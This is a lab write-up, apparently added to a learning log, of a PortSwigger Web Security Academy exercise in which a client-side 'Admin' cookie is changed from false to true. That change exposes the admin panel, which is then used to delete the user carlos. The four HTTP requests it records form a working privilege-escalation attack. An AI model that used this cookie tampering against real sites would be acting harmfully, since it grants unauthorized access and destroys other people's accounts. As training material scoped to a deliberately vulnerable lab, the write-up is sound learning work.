@@ -1,0 +1,97 @@
+DAY 24 - PORTSWIGGER ACCESS CONTROL LAB
+Lab: User role controlled by request parameter
+Target: 0a380026045a112a810c2a6800110066.web-security-academy.net
+Tool: Burp Suite
+
+============================================================
+1. NORMAL AUTHENTICATED REQUEST
+============================================================
+
+Request:
+GET /my-account?id=wiener HTTP/2
+Host: 0a380026045a112a810c2a6800110066.web-security-academy.net
+
+Cookie:
+Admin=false; session=[REDACTED]
+
+Observation:
+The authenticated user could access the normal My Account
+page, but the administrator interface was not available.
+
+============================================================
+2. ALTERED AUTHORIZATION REQUEST
+============================================================
+
+Request:
+GET /my-account?id=wiener HTTP/2
+Host: 0a380026045a112a810c2a6800110066.web-security-academy.net
+
+Cookie:
+Admin=true; session=[REDACTED]
+
+Observation:
+Changing the client-controlled Admin parameter from false to
+true caused the application to expose the Admin panel link.
+
+Response:
+HTTP/2 200 OK
+
+============================================================
+3. ADMIN PANEL ACCESS
+============================================================
+
+Request:
+GET /admin HTTP/2
+Host: 0a380026045a112a810c2a6800110066.web-security-academy.net
+
+Cookie:
+Admin=true; session=[REDACTED]
+
+Response:
+HTTP/2 200 OK
+
+Observation:
+The administrator panel became accessible and displayed the
+available user-management actions, including deletion of the
+Carlos account.
+
+============================================================
+4. ADMIN ACTION
+============================================================
+
+Request:
+GET /admin/delete?username=carlos HTTP/2
+Host: 0a380026045a112a810c2a6800110066.web-security-academy.net
+
+Cookie:
+Admin=true; session=[REDACTED]
+
+Observation:
+The Carlos account was deleted using the administrator
+functionality.
+
+The PortSwigger Web Security Academy subsequently displayed
+the lab as SOLVED.
+
+============================================================
+5. SECURITY OBSERVATION
+============================================================
+
+The application trusted a client-controlled Admin request
+parameter to determine the user's authorization level.
+
+Changing Admin=false to Admin=true allowed a normal
+authenticated user to access administrator functionality.
+
+This demonstrates an access-control failure involving
+client-controlled role information and vertical privilege
+escalation.
+
+============================================================
+6. SCOPE
+============================================================
+
+All testing was performed exclusively against the intentionally
+vulnerable PortSwigger Web Security Academy training environment.
+
+No unauthorized systems or real-world accounts were targeted.
